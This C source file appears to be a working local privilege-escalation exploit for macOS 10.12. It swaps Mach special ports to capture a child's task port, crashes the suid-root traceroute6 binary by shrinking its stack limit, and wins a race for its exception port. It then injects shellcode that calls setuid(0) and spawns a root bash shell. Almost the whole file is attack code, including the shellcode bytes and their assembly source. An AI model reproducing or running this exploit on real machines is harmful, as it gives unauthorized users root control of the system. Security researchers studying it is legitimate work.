// ianbeer
// defeat the task_t considered harmful mitigations in 10.12

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/mman.h>
#include <sys/stat.h>

#include <libkern/OSAtomic.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_vm.h>
#include <mach/task.h>
#include <mach/task_special_ports.h>
#include <mach/thread_status.h>

#define MACH_ERR(str, err) do { \
  if (err != KERN_SUCCESS) {    \
    mach_error("[-]" str "\n", err); \
    exit(EXIT_FAILURE);         \
  }                             \
} while(0)

#define FAIL(str) do { \
  printf("[-] " str "\n");  \
  exit(EXIT_FAILURE);  \
} while (0)

#define LOG(str) do { \
  printf("[+] " str"\n"); \
} while (0)

/***************
 * port dancer *
 ***************/

// set up a shared mach port pair from a child process back to its parent without using launchd
// based on the idea outlined by Robert Sesek here: https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html

// mach message for sending a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
} port_msg_send_t;

// mach message for receiving a port right
typedef struct {
  mach_msg_header_t header;
  mach_msg_body_t body;
  mach_msg_port_descriptor_t port;
  mach_msg_trailer_t trailer;
} port_msg_rcv_t;

typedef struct {
  mach_msg_header_t  header;
} simple_msg_send_t;

typedef struct {
  mach_msg_header_t  header;
  mach_msg_trailer_t trailer;
} simple_msg_rcv_t;

#define STOLEN_SPECIAL_PORT TASK_BOOTSTRAP_PORT

// a copy in the parent of the stolen special port such that it can be restored
mach_port_t saved_special_port = MACH_PORT_NULL;

// the shared port right in the parent
mach_port_t shared_port_parent = MACH_PORT_NULL;

void setup_shared_port() {
  kern_return_t err;
  // get a send right to the port we're going to overwrite so that we can both
  // restore it for ourselves and send it to our child
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &saved_special_port);
  MACH_ERR("saving original special port value", err);

  // allocate the shared port we want our child to have a send right to
  err = mach_port_allocate(mach_task_self(),
                           MACH_PORT_RIGHT_RECEIVE,
                           &shared_port_parent);

  MACH_ERR("allocating shared port", err);

  // insert the send right
  err = mach_port_insert_right(mach_task_self(),
                               shared_port_parent,
                               shared_port_parent,
                               MACH_MSG_TYPE_MAKE_SEND);
  MACH_ERR("inserting MAKE_SEND into shared port", err);

  // stash the port in the STOLEN_SPECIAL_PORT slot such that the send right survives the fork
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, shared_port_parent);
  MACH_ERR("setting special port", err);
}

mach_port_t recover_shared_port_child() {
  kern_return_t err;

  // grab the shared port which our parent stashed somewhere in the special ports
  mach_port_t shared_port_child = MACH_PORT_NULL;
  err = task_get_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, &shared_port_child);
  MACH_ERR("child getting stashed port", err);

  //LOG("child got stashed port");

  // say hello to our parent and send a reply port so it can send us back the special port to restore

  // allocate a reply port
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send the reply port in a hello message
  simple_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port_child;

  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);

  //LOG("child sent hello message to parent over shared port");

  // wait for a message on the reply port containing the stolen port to restore
  port_msg_rcv_t stolen_port_msg = {0};
  err = mach_msg(&stolen_port_msg.header, MACH_RCV_MSG, 0, sizeof(stolen_port_msg), reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
  MACH_ERR("child receiving stolen port\n", err);

  // extract the port right from the message
  mach_port_t stolen_port_to_restore = stolen_port_msg.port.name;
  if (stolen_port_to_restore == MACH_PORT_NULL) {
    FAIL("child received invalid stolen port to restore");
  }

  // restore the special port for the child
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, stolen_port_to_restore);
  MACH_ERR("child restoring special port", err);

  //LOG("child restored stolen port");
  return shared_port_child;
}

mach_port_t recover_shared_port_parent() {
  kern_return_t err;

  // restore the special port for ourselves
  err = task_set_special_port(mach_task_self(), STOLEN_SPECIAL_PORT, saved_special_port);
  MACH_ERR("parent restoring special port", err);

  // wait for a message from the child on the shared port
  simple_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port_parent,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child hello message", err);

  //LOG("parent received hello message from child");

  // send the special port to our child over the hello message's reply port
  port_msg_send_t special_port_msg = {0};

  special_port_msg.header.msgh_size        = sizeof(special_port_msg);
  special_port_msg.header.msgh_local_port  = MACH_PORT_NULL;
  special_port_msg.header.msgh_remote_port = msg.header.msgh_remote_port;
  special_port_msg.header.msgh_bits        = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(msg.header.msgh_bits), 0) | MACH_MSGH_BITS_COMPLEX;
  special_port_msg.body.msgh_descriptor_count = 1;

  special_port_msg.port.name        = saved_special_port;
  special_port_msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  special_port_msg.port.type        = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&special_port_msg.header);
  MACH_ERR("parent sending special port back to child", err);

  return shared_port_parent;
}

/*** end of port dancer code ***/

void do_child(mach_port_t shared_port) {
  kern_return_t err;

  // create a reply port to receive an ack that we should exec the target
  mach_port_t reply_port;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
  MACH_ERR("child allocating reply port", err);

  // send our task port to our parent over the shared port
  port_msg_send_t msg = {0};

  msg.header.msgh_size = sizeof(msg);
  msg.header.msgh_local_port = reply_port;
  msg.header.msgh_remote_port = shared_port;
  msg.header.msgh_bits = MACH_MSGH_BITS (MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX;

  msg.body.msgh_descriptor_count = 1;

  msg.port.name = mach_task_self();
  msg.port.disposition = MACH_MSG_TYPE_COPY_SEND;
  msg.port.type = MACH_MSG_PORT_DESCRIPTOR;

  err = mach_msg_send(&msg.header);
  MACH_ERR("child sending task port message", err);
}

mach_port_t do_parent(mach_port_t shared_port) {
  kern_return_t err;

  // wait for our child to send us its task port
  port_msg_rcv_t msg = {0};
  err = mach_msg(&msg.header,
                 MACH_RCV_MSG,
                 0,
                 sizeof(msg),
                 shared_port,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);
  MACH_ERR("parent receiving child task port message", err);

  mach_port_t child_task_port = msg.port.name;
  if (child_task_port == MACH_PORT_NULL) {
    FAIL("invalid child task port");
  }

  return child_task_port;
}


void sploit_child() {
  kern_return_t err;

  // force a tiny stack so the suid binary will crash:
  // this needs to be set back to a large value in shellcode
  struct rlimit lim = {0x1000, 0x1000};
  int res = setrlimit(RLIMIT_STACK, &lim);
  if (res != 0) {
    printf("failed to set new stack limit\n");
  }

  // exec the suid-root target 
  char* argv[] = {"/usr/sbin/traceroute6", "-w", "NOPE", 0};
  execve("/usr/sbin/traceroute6", argv, NULL);
}

struct exception_raise_msg {
  mach_msg_header_t Head;
  /* start of the kernel processed data */
  mach_msg_body_t msgh_body;
  mach_msg_port_descriptor_t thread;
  mach_msg_port_descriptor_t task;
  /* end of the kernel processed data */
  NDR_record_t NDR;
  exception_type_t exception;
  mach_msg_type_number_t codeCnt;
  integer_t code[2];
  mach_msg_trailer_t trailer;
};

struct exception_reply_msg {
  mach_msg_header_t Head;
  NDR_record_t NDR;
  kern_return_t RetCode;
};

/*
shellcode for:

  struct rlimit lim = {0x1000000, 0x1000000};
  setrlimit(RLIMIT_STACK, lim);
  setuid(0);
  char* argv[2] = {"/bin/bash", 0};
  execve("/bin/bash", argv, 0);


BITS 64

global start
section .text
start:

  mov edi, 0x1000000
  push rdi
  push rdi
  mov rsi, rsp
  mov edi, 3 ;RLIMIT_STACK
  mov eax, 0x20000c3 ;setrlimit
  syscall

  xor rdi, rdi
  mov eax, 0x2000017 ;setuid
  syscall

  call got_str
db '/bin/bash',0
got_str:
  pop rdi
  xor rbx, rbx 
  push rbx
  push rdi
  mov rsi, rsp
  xor rdx, rdx
  mov eax, 0x200003b ;execve
  syscall
*/

uint8_t sc[] = {
0xbf, 0x00, 0x00, 0x00, 0x01, 0x57, 0x57, 0x48, 0x89, 0xe6, 0xbf, 0x03, 0x00, 0x00, 0x00, 0xb8,
0xc3, 0x00, 0x00, 0x02, 0x0f, 0x05, 0x48, 0x31, 0xff, 0xb8, 0x17, 0x00, 0x00, 0x02, 0x0f, 0x05,
0xe8, 0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x5f,
0x48, 0x31, 0xdb, 0x53, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x31, 0xd2, 0xb8, 0x3b, 0x00, 0x00, 0x02,
0x0f, 0x05};

// return 0 to try again
int sploit_parent(mach_port_t child_task_port, mach_port_t exception_port) {
  kern_return_t err;
  kern_return_t set_exception_ports_err = KERN_SUCCESS;

  while (set_exception_ports_err == KERN_SUCCESS) {
    set_exception_ports_err = task_set_exception_ports(
                                child_task_port,
                                EXC_MASK_ALL,
                                exception_port,
                                EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES,  // we want to receive a catch_exception_raise message
                                THREAD_STATE_NONE);
  }

  // setting the exception port has now started failing
  // try to receive a message; use a timeout because we may have lost the race and need to try again:

  size_t size = 0x1000;
  struct exception_raise_msg* request = malloc(size);
  memset(request, 0, size);
  
  err = mach_msg(&request->Head,
                 MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                 0,
                 size,
                 exception_port,
                 10, // 10ms timeout
                 0);

  if (err != KERN_SUCCESS) {
    printf("[-] failed to receive message on exception port - trying again (%s)\n", mach_error_string(err));
    return 0;
  }

  // we got it!
  printf("[+] got exception message with target's task and thread ports\n");
  mach_port_t target_task = request->task.name;
  mach_port_t target_thread = request->thread.name;

  // allocate some memory in the task
  mach_vm_address_t shellcode_addr = 0;
  err = mach_vm_allocate(target_task,
                         &shellcode_addr,
                         0x1000,
                         VM_FLAGS_ANYWHERE);

  if (err != KERN_SUCCESS) {
    printf("[-] mach_vm_allocate: %s\n", mach_error_string(err));
    return 1;
  }
  printf("[+] allocated shellcode in target at %llx\n", shellcode_addr);

  // write the shellcode there:
  err = mach_vm_write(target_task,
                      shellcode_addr,
                      (vm_offset_t)sc,
                      sizeof(sc));
  
  if (err != KERN_SUCCESS) {
    printf("[-] mach_vm_write: %s\n", mach_error_string(err));
    return 1;
  }

  // make it executable
  err = mach_vm_protect(target_task,
                        shellcode_addr,
                        0x1000,
                        0,
                        VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE); // also writeable because we put the stack there
  
  if (err != KERN_SUCCESS) {
    printf("[-] mach_vm_protect: %s\n", mach_error_string(err));
    return 1;
  }

  // set the thread state to point to the the shellcode
  x86_thread_state64_t state;
  mach_msg_type_number_t stateCount = x86_THREAD_STATE64_COUNT;

  memset(&state, 0, sizeof(state));

  state.__rip = (uint64_t)shellcode_addr;
  state.__rsp = (uint64_t)shellcode_addr + 0x800; // the shellcode uses the stack
  
  err = thread_set_state(target_thread, 
                        x86_THREAD_STATE64,
                        (thread_state_t)&state,
                        stateCount); 
  
  if (err != KERN_SUCCESS) {
    printf("[-] thread_set_state: %s\n", mach_error_string(err));
    return 1;
  }

  // reply to the exception message 
  struct exception_reply_msg reply = {0};
  reply.Head.msgh_remote_port = request->Head.msgh_remote_port;
  reply.Head.msgh_bits = MACH_MSGH_BITS(MACH_MSGH_BITS_REMOTE(request->Head.msgh_bits), 0);
  reply.Head.msgh_id = request->Head.msgh_id + 100;
  reply.Head.msgh_size = sizeof(reply);
  reply.NDR = NDR_record;
  reply.RetCode = MACH_MSG_SUCCESS;

  err = mach_msg(&reply.Head,
                 MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                 (mach_msg_size_t)sizeof(reply),
                 0,
                 MACH_PORT_NULL,
                 MACH_MSG_TIMEOUT_NONE,
                 MACH_PORT_NULL);

  if (err != KERN_SUCCESS) {
    printf("[-] mach_msg sending reply to exception message: %s\n", mach_error_string(err));
    return 1;
  }

  return 1;
}

int main(int argc, char** argv) {  
  int done = 0;
  kern_return_t err;
  mach_port_t exception_port = MACH_PORT_NULL;
  err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &exception_port);
  if (err != KERN_SUCCESS) {
    printf("[-] failed to allocate port\n");
    return 1;
  }

  err = mach_port_insert_right(mach_task_self(),
                               exception_port,
                               exception_port,
                               MACH_MSG_TYPE_MAKE_SEND);

  if (err != KERN_SUCCESS) {
    printf("[-] failed to insert send right\n");
    return 1;
  }

  while (!done) {
    setup_shared_port();
    pid_t child_pid = fork();
    if (child_pid == -1) {
      FAIL("forking");
    }

    if (child_pid == 0) {
      mach_port_t shared_port_child = recover_shared_port_child();
      do_child(shared_port_child);
      sploit_child();
    } else {
      mach_port_t shared_port_parent = recover_shared_port_parent();
      mach_port_t child_task_port = do_parent(shared_port_parent);
      done = sploit_parent(child_task_port, exception_port);
      int sl;
      wait(&sl);
    }
  }

  mach_port_destroy(mach_task_self(), exception_port);
  return 0;
}
